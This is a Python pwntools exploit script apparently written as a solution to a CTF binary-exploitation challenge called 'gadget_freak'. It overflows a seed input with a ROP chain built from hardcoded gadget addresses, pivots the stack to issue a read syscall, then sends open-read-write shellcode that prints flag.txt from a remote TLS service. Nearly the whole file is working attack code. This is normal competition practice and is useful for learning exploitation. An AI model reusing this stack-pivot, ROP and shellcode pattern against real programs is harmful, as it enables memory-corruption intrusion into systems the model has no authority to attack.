from pwn import *

exe = './gadget_freak'

(dname,dport) = ("/app/run",1337)
(host,port)   = ("gadget-freak.harkonnen.b01lersc.tf"  ,8443)

# ==================[START DEFINIITONS]======================

def start(argv=[], *a, **kw):
    # RUN AS ROOT  <VIS BREAKS THOUGH, SO BEWARE> 
    if args.DOCKER:
        proc = remote("localhost",dport)
        time.sleep(1)
        pid = int(process(["pgrep", "-fx", dname]).recvall().strip().decode())
        gdb.attach(pid, gdbscript,exe=exe)
        return proc

    # DEBUGGING WITH GDB FOR LOCAL
    elif args.GDB: return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    # RUNNING FOR REMOTE 
    elif args.RE: return remote(host,port,ssl=True)
    # NORMAL RUNS 
    else: return process([exe] + argv, *a, **kw)

gdbscript = '''
b * main
'''.format(**locals())

context.terminal = ["gnome-terminal", "--"]

# ====================[EXPANSIONS]=========================

se  = lambda data  : p.send(data)
sl  = lambda data  : p.sendline(data)
sa  = lambda ip,op : p.sendafter(ip,op)
sla = lambda ip,op : p.sendlineafter(ip,op) 
rvu = lambda data  : p.recvuntil(data)
rvl = lambda       : p.recvline()
rv  = lambda nbyts : p.recv(nbyts)  
pop = lambda       : p.interactive()

# >>>>>>>>>>>>>>>>[EXPLOIT STARTS HERE]>>>>>>>>>>>>>>>>>>>>

def getgad(idx):
    sla(b"choice:",b"1")
    sl(f"{idx}".encode())

def sus():
    sla(b"choice:",b"7")

def setSeed(payload):
    sla(b"choice:",b"2")
    sla(b"128 characters):",payload)

def bye():
    sla(b"choice:",b"3")

def orw():
    return asm('''
        lea rdi, [rip+flag]
        xor esi, esi
        mov eax, 0x2
        syscall

        mov rdi, rax
        mov esi, 0x300000
        mov edx, 0x50
        mov eax, 0x0
        syscall

        mov rdi, 0x1
        mov esi, 0x300000
        mov edx, 0x50
        mov eax, 0x1
        syscall

        mov rax, 0x3c
        mov rdi, 0x0
        syscall

        flag:
            .string "flag.txt"
    ''')

context.arch = "x86_64"

p = start()

# GADGET 148
# =============================
#    0:   94                      xchg   esp, eax
#    1:   c3                      ret

poprdi  = 0x330d7c
poprsi  = 0x330d78
poprdx  = 0x330d68
poprax  = 0x330d60
ret     = 0x330d7d
syscl   = 0x30143c

def syscall(rax,rdi,rsi,rdx):
    payload = p64(poprdi) + p64(rdi) + p64(poprsi) + p64(rsi) + p64(poprdx) + p64(rdx) + p64(poprax) + p64(rax)
    return payload

payload = (syscall(0x0,0x0,0x30143e,0x100) + p64(syscl)).ljust(0x80,b"a") + p64(0x7) + p64(0x330e50)
setSeed(payload)
sus()

sl(orw())

pop()
